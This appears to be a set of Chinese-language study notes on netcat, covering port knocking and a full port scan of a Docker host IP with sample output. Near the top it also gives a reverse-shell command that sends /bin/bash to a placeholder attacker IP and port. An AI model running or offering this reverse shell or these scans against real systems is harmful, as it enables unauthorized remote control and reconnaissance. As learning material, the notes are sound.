netcat 该工具在两个设备之间建立TCP/UDP连接

获取shell只不过是它的一个用法，他还能扫端口等；

用法：

nc 攻击者ip 攻击者端口号 -e /bin/bash

-e参数（execute）在攻击者主机的那个端口开启本地bash,就是把自己本地的bash在网络连接中扔给对方，对方监听那个端口，就可以控制你的主机了，所以常用来做反弹shell，

```
nc -z   #-z 在建立网络连接后立即断开，通常用于端口敲门，或者快速扫描端口受否开放
```

```
-w (wait等待) -w 2
设置超时时间，自动断开，单位 秒
闲置超时：在连接建立后的数据传输过程中，如果双方在一定时间内没有任何数据往来，nc 也会自动断开连接。
连接超时：如果网络不通或对方防火墙拦截了请求，nc会一直等，所以要设置超时
```

```
#端口敲门(用-z参数)
nc -z -w 1 192.168.18.131 7000 7880 5212
```

## 命令分解

bash

nc -zv 172.17.0.1 1-65535 2>&1 | grep -v refused

### 各部分含义

| 部分                | 含义         | 说明                     |
| ----------------- | ---------- | ---------------------- |
| `nc`              | Netcat     | 网络工具，用于读写网络连接          |
| `-z`              | Zero I/O模式 | 只扫描不发送数据（不建立完整连接）      |
| `-v`              | Verbose    | 详细输出模式，显示扫描结果          |
| `172.17.0.1`      | 目标IP       | Docker默认网桥IP（通常是宿主机）   |
| `1-65535`         | 端口范围       | 扫描所有TCP端口（1到65535）     |
| `2>&1`            | 重定向        | 将stderr合并到stdout（统一输出） |
| `\|`              | 管道         | 将输出传递给grep处理           |
| `grep -v refused` | 过滤         | 排除包含"refused"的行        |

---

## 执行效果示例

### 有开放端口的情况

bash

$ nc -zv 172.17.0.1 1-65535 2>&1 | grep -v refused

# 输出（仅显示开放端口）

Connection to 172.17.0.1 22 port [tcp/ssh] succeeded!
Connection to 172.17.0.1 80 port [tcp/http] succeeded!
Connection to 172.17.0.1 443 port [tcp/https] succeeded!
Connection to 172.17.0.1 3306 port [tcp/mysql] succeeded!

### 无开放端口或都被过滤

bash

$ nc -zv 172.17.0.1 1-65535 2>&1 | grep -v refused

# 无输出（所有端口都被拒绝或超时）

---

## 工作原理详解

### 1. `nc -zv` 的扫描过程

### 2. `2>&1` 的作用

bash

# 默认情况下

nc -zv 172.17.0.1 80

# stdout: Connection to 172.17.0.1 80 port [tcp/http] succeeded!

# stderr: (无输出)

nc -zv 172.17.0.1 9999

# stdout: (无输出)

# stderr: nc: connect to 172.17.0.1 port 9999 (tcp) failed: Connection refused

# 使用 2>&1 后，所有输出合并

nc -zv 172.17.0.1 9999 2>&1

# 全部输出到stdout，方便管道处理

### 3. `grep -v refused` 过滤

bash

# -v 表示反向匹配（不包含）

grep -v refused  # 显示所有不包含 "refused" 的行

# 效果：只显示成功的连接，隐藏拒绝的连接
